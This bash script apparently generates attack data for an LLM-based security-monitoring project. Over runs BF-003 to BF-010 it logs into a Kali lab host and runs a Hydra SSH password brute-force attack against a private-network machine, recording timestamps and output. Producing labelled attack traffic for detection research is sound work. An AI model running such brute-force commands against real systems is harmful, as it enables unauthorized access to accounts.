#!/bin/bash
set -euo pipefail

BASE="$HOME/llm-soc/dataset/runs/brute_force"
KALI="kali@192.168.186.185"

for n in $(seq 3 10); do
    ID=$(printf "BF-%03d" "$n")
    DIR="$BASE/$ID"

    if [ -e "$DIR/start_time.txt" ]; then
        echo "ERROR: $ID da co start_time.txt, dung de tranh ghi de."
        exit 1
    fi

    mkdir -p "$DIR"
    date -u +"%Y-%m-%dT%H:%M:%SZ" > "$DIR/start_time.txt"

    echo "=== Bat dau $ID ==="

    if ssh -o BatchMode=yes "$KALI" \
        'hydra -l kali -P /tmp/bf001_passwords.txt -t 1 -f -V ssh://192.168.186.186' \
        > "$DIR/hydra_output.txt" 2>&1; then
        echo "0" > "$DIR/hydra_exit_code.txt"
    else
        STATUS=$?
        echo "$STATUS" > "$DIR/hydra_exit_code.txt"
        date -u +"%Y-%m-%dT%H:%M:%SZ" > "$DIR/end_time.txt"
        echo "ERROR: Hydra tai $ID, exit code $STATUS"
        exit 1
    fi

    date -u +"%Y-%m-%dT%H:%M:%SZ" > "$DIR/end_time.txt"
    echo "=== Hoan thanh $ID ==="

    if [ "$n" -lt 10 ]; then
        sleep 15
    fi
done

echo "HOAN THANH BF-003 DEN BF-010"
